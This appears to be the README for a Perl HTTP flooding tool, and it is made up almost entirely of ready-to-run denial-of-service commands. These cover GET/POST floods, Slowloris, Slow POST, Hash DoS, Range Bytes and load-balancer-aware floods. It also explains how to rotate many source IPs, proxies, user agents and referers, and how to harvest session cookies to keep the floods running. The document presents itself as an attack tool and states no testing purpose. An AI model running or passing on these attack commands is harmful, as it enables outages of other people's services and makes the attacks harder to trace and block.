# Usage #

```
bunyamin$ perl httpflooder.pl --help
HTTP Flooder, v1.0
   Usage: httpflooder.pl [options]
	  [--attack]      -a  : Attack Type GF  => GET Flood,
                                            PF  => POST Flood,
                                            SH  => Slow Headers,
                                            SP  => Slow POST,
                                            HD  => Hash DoS,
                                            MX  => GET/POST Flood,
                                            RB  => Range Bytes,
                                            HF  => HTTP Header Fuzz,
                                            SHF => Slow Header Fuzz
                                            BF  => MX Flood over Balancer
	  [--host]        -h  : Host for attack
	  [--cookie]      -c  : Cookie for HTTP Request Header
	  [--url]         -u  : Request URL
	  [--urls]            : Request URL files
	  [--port]        -p  : Port for HTTP request
	  [--https]           : SSL support
	  [--ip]          -i  : Source IP
	  [--ips]             : Source IPs files
	  [--useragent]   -ua : User-Agent for HTTP Request Header
	  [--useragents]      : User-Agent files for HTTP Request Header
	  [--referer]         : Referer header for HTTP Request
	  [--referers]        : Referer header files for HTTP Requests
	  [--proxy_file]      : Proxy IP list fpr HTTP request over proxy
	  [--keepalive]       : Connection : Keep-Alive Header
	  [--closehead]       : Close header (added CRLF)
	  [--ulength]         : Length for random generated url
	  [--extension]       : File extension for random generated url
	  [--clength]         : Content-Length for slowpost
	  [--thread]      -t  : Thread number for tool.
          [--balancer]        : User balancer
          [--custom-cookie]   : Extract custom Cookie value in response
          [--basic-auth]      : Basic Authentication for HTTP Request
	  [--num]         -n  : Connection number for tool.
	  [--interval]        : Add headers/data/param per request for Slow Headers/POST/Params attack.
	  [--delay]           : Delay per additional header in a request for Slow Headers attack.
	  [--duration]        : Duration for test (second)
          [--verbose]     -v  : verbose output
                                1 => Thread, Host, IP, Response Code
                                2 => Request
                                3 => Request, Response
          [--help]            : Display usage and options
```


HTTPFlooder does not support IP Spoofing. If you want to attack with many different IP addresses, virtual IP addresses need to be defined within the operating system. For this purpose, each virtual IP is added as a single line within a file. The following example shows the usage of HTTPFlooder using various IP addresses.

bunyamin$ perl httpflooder.pl -a GF -h www.site.com **--ips ips.txt** --urls urls.txt  -t 1 -n 1

In this GET Flood attack, the IP addresses are randomly chosen and used from the ips.txt file.

## Attack Types ##

### GET Flood ###

bunyamin$ perl httpflooder.pl -a **GF** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000

-t parameter means; 50 thread work for this attack.

-n parameter means; 1000 HTTP GET request with 50 threads.

If ips.txt file contains 10 IP addresses, 5 threads and 100 HTTP requests are created for each IP address.

### POST Flood ###

bunyamin$ perl httpflooder.pl -a **PF** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000

### Slow Headers (Slowloris) ###

bunyamin$ perl httpflooder.pl -a **SH** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 --interval 10 --delay 2 --keepalive

--interval will add 10 extra headers per request

--delay delay value for each header adding operation

### Slow POST ###

bunyamin$ perl httpflooder.pl -a **SP** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 --clength 20 --delay 2 --keepalive -v 3

--clength means “Content-Length”. So it will add 20 characters in POST body.

--delay delay value for each POST body character adding operation.

### Hash DoS ###

bunyamin$ perl httpflooder.pl -a **HD** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 --interval 1000

--interval will add post param and value until interval (a1=b1&...&a1000=b1000)

### MX Flood (GET/POST Flood) ###

You can use GET and POST flood at the same time with this type. Just need to prepare “urls.txt” file like below.

/get.jsp
/post.jsp#param1=value1&param2=value

bunyamin$ perl httpflooder.pl -a **MX** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000

### Range Bytes ###

bunyamin$ perl httpflooder.pl -a **RB** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000

### MX Flood over Balancer ###

urls.txt file contains the scenario of the attack as in the MX flood attack type. So the scenarios in the urls.txt will be executed as much as the count which stated with -n/-num parameter.

sample url.txt file;

/index.jsp
/login.jsp#username=value1&password=value
/product.jsp?cmd=add#productID=1

bunyamin$ perl httpflooder.pl -a **BF** -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 --balancer

--balancer option will collect all the “Set-Cookie” value for the using in next request.

## Features ##

### SSL Support ###

bunyamin$ perl httpflooder.pl -a GF -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 **--https**

### Cookie Based Request ###

bunyamin$ perl httpflooder.pl -a GF -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 **--cookie=”JSESSIONID=123442FDJd34234343dfddDDF”**

### Custom Cookie ###

You can use this option with MX Flood over balancer (Attack type is BF). It should collect the custom cookie in HTTP Response, not in Set-Cookie. Because “--balancer” option will collect cookie in “Set-Cookie” option.

For example;

```
<script>
document.cookie=’BNYID=RTFRT482378jdmbfd34543543’;
</script>
```

bunyamin$ perl httpflooder.pl -a GF -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 **--custom-cookie BNYID**

### Basic Authentication ###

bunyamin$ perl httpflooder.pl -a GF -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 **--basic-auth=“bunyamin:123456”**

### Proxy Support ###

Need to prepare proxies.txt file for Proxy IP and Port like beloww

122.31.34.13:8080
123.56.111.7:8181

bunyamin$ perl httpflooder.pl -a GF -h www.site.com --ips ips.txt --urls urls.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 **--proxy\_file proxies.txt**

### Random Generated URL ###

bunyamin$ perl httpflooder.pl -a GF -h www.site.com --ips ips.txt --useragents useragents.txt --referers referers.txt -t 50 -n 1000 **--ulength 20**

It will generate URL with 20 character randomly for each request.